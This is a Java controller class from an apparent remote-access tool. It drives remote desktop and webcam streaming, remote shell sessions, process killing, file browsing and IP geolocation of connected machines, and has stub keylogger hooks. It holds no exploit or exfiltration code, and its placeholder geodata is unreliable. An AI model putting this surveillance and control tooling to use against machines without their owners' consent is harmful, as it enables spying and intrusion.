package com.melardev.xeytanj.services.net;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.maxmind.geoip2.DatabaseReader;
import com.maxmind.geoip2.exception.GeoIp2Exception;
import com.maxmind.geoip2.model.CityResponse;
import com.melardev.xeytanj.enums.MediaState;
import com.melardev.xeytanj.enums.NetworkProtocol;
import com.melardev.xeytanj.enums.ProcessInfoDetails;
import com.melardev.xeytanj.maps.ClientGeoStructure;
import com.melardev.xeytanj.models.*;
import com.melardev.xeytanj.net.packets.PacketLogin;
import com.melardev.xeytanj.net.packets.PacketPresentation;
import com.melardev.xeytanj.net.packets.PacketType;
import com.melardev.xeytanj.services.config.IConfigService;
import com.melardev.xeytanj.services.logger.ILogger;
import com.melardev.xeytanj.services.net.transport.p2p.async.completion.AsyncClientCompletionHandler;
import com.melardev.xeytanj.services.net.transport.p2p.async.completion.AsyncServerCompletionHandler;
import com.melardev.xeytanj.services.net.transport.p2p.async.select.AsyncClientSelectKey;
import com.melardev.xeytanj.services.net.transport.p2p.async.select.AsyncServerSelectKey;
import com.melardev.xeytanj.services.net.transport.p2p.sync.P2PClientService;

import javax.swing.*;
import java.io.IOException;
import java.net.InetAddress;
import java.net.Socket;
import java.nio.channels.AsynchronousSocketChannel;
import java.nio.channels.SocketChannel;
import java.util.*;

import static com.melardev.xeytanj.net.packets.PacketType.*;

public class ClientController {

    private final ILogger logger;
    private final IConfigService config;
    private final UUID id;
    private INetworkServerService netServerService;
    private ClientContext clientContext;
    private Client client;
    private Set<PacketType> expectedPackets;
    private DatabaseReader geoDB;


    private ClientController(INetworkServerService netServerService,
                             INetworkClientService networkClientService,
                             ILogger logger, IConfigService configService) {
        expectedPackets = new HashSet<>();
        this.logger = logger;
        this.config = configService;
        this.netServerService = netServerService;

        this.id = UUID.randomUUID();
        client = new Client(id);

        networkClientService.setLogger(logger);
        networkClientService.setConfig(config);
        networkClientService.setClientController(this);

        clientContext = new ClientContext(id);
        clientContext.setNetClientService(networkClientService);
        clientContext.setNetServerService(netServerService);

        String globalIp = networkClientService.getRemoteIp();
        setGlobalIp(globalIp);
    }

    // Controller used to Synchronous sockets
    public ClientController(INetworkServerService netServerService, Socket clientSocket, ILogger logger, IConfigService config) {
        this(netServerService, new P2PClientService(clientSocket), logger, config);
    }

    // Controller used for Asynchronous sockets using CompletedHandler<> interfaces
    public ClientController(AsyncServerCompletionHandler netServerService,
                            AsynchronousSocketChannel asynchronousSocketChannel,
                            ILogger logger, IConfigService config) {
        this(netServerService,
                new AsyncClientCompletionHandler(asynchronousSocketChannel),
                logger, config);
    }

    public ClientController(AsyncServerSelectKey serverService, SocketChannel socketChannel, ILogger logger, IConfigService config) {
        this(serverService,
                new AsyncClientSelectKey(socketChannel), logger, config);

    }

    public Client getClient() {
        return client;
    }

    public UUID getClientId() {
        return client.getId();
    }


    public String getPcName() {
        return client.getPcName();
    }


    public Double getLat() {
        return client.getGeoData().getLat();
    }

    public Double getLon() {
        return getClient().getGeoData().getLon();
    }

    public String getJreVersion() {
        return client.getJreVersion();
    }

    public void setJreVersion(String version) {
        client.setJreVersion(version);
    }


    private INetworkClientService getNetworkService() {
        return getClientContext().getNetClientService();
    }

    public void startRemoteDesktop() {
        INetworkClientService netClientService = getClientContext().getNetClientService();
        if (!netClientService.isStreamingDesktop()) {
            appendExpectedPacket(DESKTOP_CONFIG);
            netClientService.startRdpSession();
        }
    }


    public void startListProcess(ProcessInfoDetails level) {
        appendExpectedPacket(PROCESS);
        getClientContext().getNetClientService().startListProcess(level);
    }

    public void startShellSessionService() {
        logger.traceCurrentMethodName();
        appendExpectedPacket(SHELL);
        getClientContext().getNetClientService().startShellSessionService();
    }

    public void startKeyLogSession() {
    }

    public ClientContext getClientContext() {
        return clientContext;
    }

    public void setClientContext(ClientContext clientContext) {
        this.clientContext = clientContext;
    }

    public void setNetService(INetworkClientService networkClientService) {
        getClientContext().setNetClientService(networkClientService);
    }


    public void startRebootSystem() {

    }

    public void startShutDownSystem() {

    }

    public void startLogOffSystem() {
    }

    public void startLockSystem() {
    }

    public void startTurnDisplay(boolean on) {
    }

    public String getOS() {
        return null;
    }

    public String getCity() {
        return null;
    }


    public String getIP() {
        return null;
    }

    // TODO: Remove this Exception
    public void startSession() throws IOException {
        clientContext.getNetClientService().interactAsync();
    }

    public void setClientStructure(ClientInfoStructure clientStructure) {
        getClientContext().setClientStructure(clientStructure);
    }

    public void setOs(String os) {
        client.setOs(os);
        client.setOs(os);
    }

    public void setPcName(String pcName) {
        client.setPcName(pcName);
        client.setPcName(pcName);
    }

    public void setGlobalIp(String globalIp) {
        client.setGlobalIp(globalIp);
    }

    public void setGeoData(ClientGeoStructure geoData) {
        client.setGeoData(geoData);
    }

    public String getCountry() {
        return getClientContext().getInfoStructure().getGeoData().getCountry();
    }

    public void setLocalIp(String localIp) {
        client.setLocalIp(localIp);
    }

    public boolean isStreamingDesktop() {
        return getClientContext().getNetClientService().isStreamingDesktop();
    }

    public void pauseRemoteDesktop() {
        getClientContext().getNetClientService().pauseRemoteDesktop();
    }


    public void appendExpectedPacket(PacketType packetType) {
        expectedPackets.add(packetType);
    }

    public void getSystemInfo() {
        appendExpectedPacket(PRESENTATION);
        getClientContext().getNetClientService().getSystemInfo();
    }

    public void playRemoteDesktop(MediaConfigState configState) {
        appendExpectedPacket(DESKTOP);
        getClientContext().getNetClientService().playRemoteDesktop(configState);
    }

    public void stopRemoteDesktop() {
        removeExpectedPacket(DESKTOP);
        getClientContext().getNetClientService().stopRemoteDesktop();
    }

    public void startCameraSession(NetworkProtocol protocol) {
        INetworkClientService netClientService = getClientContext().getNetClientService();
        if (!netClientService.isStreamingCamera()) {
            appendExpectedPacket(CAMERA_CONFIG);
            netClientService.startCameraSession(protocol);
        }
    }

    public void playRemoteCamera(MediaConfigState configState) {
        MediaState mediaState = getNetworkService().getCameraMediaState();
        if (mediaState == MediaState.WAITING_DEVICE_SELECTION || mediaState == MediaState.PAUSED) {
            appendExpectedPacket(CAMERA);
            getClientContext().getNetClientService().playRemoteCamera(configState);
        } else if (mediaState == MediaState.STOPPED) {
            getClientContext().getNetClientService().startCameraSession(NetworkProtocol.TCP);
        }

    }

    public void pauseCameraStreaming() {
        removeExpectedPacket(CAMERA);
        getClientContext().getNetClientService().pauseCameraStreaming();
    }

    public void stopCameraSession() {
        removeExpectedPacket(CAMERA);
        getClientContext().getNetClientService().stopCameraSession();
    }

    public void killProcess(int pid) {
        getClientContext().getNetClientService().killProcess(pid);
    }

    public void stopProcessMonitor() {
        removeExpectedPacket(PROCESS);
        getClientContext().getNetClientService().stopProcessMonitor();
    }

    public void getFileSystemView(String fileSystemPath) {
        appendExpectedPacket(FILE_EXPLORER);
        getClientContext().getNetClientService().getFileSystemView(fileSystemPath);
    }

    public void removeExpectedPacket(PacketType packetType) {
        expectedPackets.remove(packetType);
    }

    public boolean isExpectingPacket(PacketType packetType) {
        return expectedPackets.contains(packetType);
    }

    public void interactAsync() {
        getClientContext().getNetClientService().interactAsync();
    }

    public void onClientLoggedIn(PacketLogin packet, String globalIp) {
        setOs(packet.getOs());
        setPcName(packet.getPcName());
        setGlobalIp(globalIp);
        ClientGeoStructure clientGeoStructure = new ClientGeoStructure();

        String country = "unknown";
        if (!isPrivateIPv4(globalIp) && config.resolveGeoIpLocally()) {
            if (geoDB == null) {
                try {
                    geoDB = new DatabaseReader.Builder(getClass().getClassLoader().getResourceAsStream("geo/GeoLite2-City.mmdb")).build();
                } catch (IOException e) {
                    e.printStackTrace();
                    return;
                }
            }

            CityResponse city;

            try {
                city = geoDB.city(InetAddress.getByName(globalIp));
                clientGeoStructure.setCity(city.getCity().getName());
                clientGeoStructure.setCountry(city.getCountry().getName());
                clientGeoStructure.setLat(city.getLocation().getLatitude());
                clientGeoStructure.setLon(city.getLocation().getLongitude());

            } catch (IOException | GeoIp2Exception e) {
                e.printStackTrace();
                // Test data, this may happen when localhost is the client so
                // 127.0.0.1 is the Ip, Maxmind database will throw an exception

                clientGeoStructure.setCity("Paris");
                clientGeoStructure.setCountry("France");
                clientGeoStructure.setLat(2.2);
                clientGeoStructure.setLon(15.0);
            }

        } else {
            //Get info by website
            String geoData = "{\"as\":\"AS6739 VODAFONE ONO, S.A.\",\"city\":\"Random\",\"country\":\"Random\",\"countryCode\":\"Random\",\"isp\":\"Random\",\"lat\":111.111,\"lon\":222.222,\"org\":\"Random \",\"query\":\"11.11.111.111\",\"region\":\"CT\",\"regionName\":\"Random\",\"status\":\"success\",\"timezone\":\"Europe/Madrid\",\"zip\":\"162100\"}";//getGeoData();
            JsonObject jsonObject = new JsonParser().parse(geoData).getAsJsonObject();
            country = jsonObject.get("country").getAsString();
            clientGeoStructure.setCity(jsonObject.get("city").getAsString());
            clientGeoStructure.setCountry(country);
            clientGeoStructure.setLat(jsonObject.get("lat").getAsDouble());
            clientGeoStructure.setLon(jsonObject.get("lon").getAsDouble());
        }

        client.setGeoData(clientGeoStructure);
        client.setOs(packet.getOs());
        setLocalIp(packet.getlocalIp());
        netServerService.onClientLoggedIn(client);
    }

    private boolean isPrivateIPv4(String ipAddress) {
        try {
            String[] octetParts = ipAddress.split("\\.");

            int firstOctet = Integer.parseInt(octetParts[0]);
            int secondOctet = Integer.parseInt(octetParts[1]);

            switch (firstOctet) {
                case 10:
                case 127:
                    return true;
                case 172:
                    return (secondOctet >= 16) && (secondOctet < 32);
                case 192:
                    return (secondOctet == 168);
                case 169:
                    return (secondOctet == 254);
            }
        } catch (Exception ex) {
        }
        return false;
    }

    public static boolean isPrivateIPv6(String ipAddress) {
        boolean isPrivateIPv6 = false;
        String[] ipParts = ipAddress.trim().split(":");
        if (ipParts.length > 0) {
            String firstBlock = ipParts[0];
            String prefix = firstBlock.substring(0, 2);

            if (firstBlock.equalsIgnoreCase("fe80")
                    || firstBlock.equalsIgnoreCase("100")
                    || ((prefix.equalsIgnoreCase("fc") && firstBlock.length() >= 4))
                    || ((prefix.equalsIgnoreCase("fd") && firstBlock.length() >= 4))) {
                isPrivateIPv6 = true;
            }
        }
        return isPrivateIPv6;
    }

    public void onPresentationData(PacketPresentation packet) {
        if (!isExpectingPacket(PRESENTATION))
            return;

        removeExpectedPacket(PRESENTATION);

        logger.traceCurrentMethodName();
        Map<String, String> properties = packet.getProperties();
        Map<String, String> env = packet.getEnv();
        String localIp = packet.getLocalIp();


        netServerService.onPresentationData(client, env, properties);
    }

    public void onClientDisconnected() {
        netServerService.onClientDisconnected(client);
    }

    public void onDesktopImageReceived(ImageIcon image) {
        netServerService.onDesktopImageReceived(client, image);
    }

    public void onDesktopConfigInfoReceived(List<ScreenDeviceInfo> screenDeviceInfoList) {
        removeExpectedPacket(DESKTOP_CONFIG);
        netServerService.onDesktopConfigInfoReceived(client, screenDeviceInfoList);
    }

    public void onDesktopSessionClosed() {

    }

    public void onFilesystemRootInfoReceived(FileInfoStructure[] files) {
        netServerService.onFilesystemRootInfoReceived(client, files);
    }

    public void onFileSystemInfoUpdate(FileInfoStructure[] files) {
        netServerService.onFileSystemInfoUpdate(client, files);
    }

    public void onKeylogDataReceived(String logs) {

    }

    public void onKeylogSessionClosed() {


    }

    public void onChatMessageReceived(String message) {
        netServerService.onChatMessageReceived(client, message);
    }

    public void onClientReadyForDesktop() {

    }

    public void onClientReadyForCamera() {

    }

    public void onCameraPacketReceived(Icon image) {
        netServerService.onCameraImageReceived(client, image);
    }

    public void onProcessInfoReceived(List<ProcessStructure> info) {
        netServerService.onProcessInfoReceived(client, info);
    }

    public void onClientShellInfoReceived(String output) {
        netServerService.onClientShellInfoReceived(client, output);
    }

    public void onShellSessionClosedByUser() {

    }

    public void startFileManagerSession() {
        appendExpectedPacket(FILE_EXPLORER);
        getClientContext().getNetClientService().startFileManagerSession();
    }

    public void startChatSession() {
        appendExpectedPacket(CHAT);
        getClientContext().getNetClientService().startChatSession();
    }

    public void stopShellSession() {
        removeExpectedPacket(SHELL);
        getClientContext().getNetClientService().stopShellSession();
    }

    public boolean shouldHandlePacket(PacketType packetType) {
        return isExpectingPacket(packetType);
    }

    public void onCameraConfigInfoReceived(List<CameraDeviceInfo> cameras) {
        removeExpectedPacket(CAMERA_CONFIG);
        netServerService.onCameraConfigInfoReceived(client, cameras);
    }

    public void sendChatMessage(String message) {
        getClientContext().getNetClientService().sendChatMessage(message);
    }
}
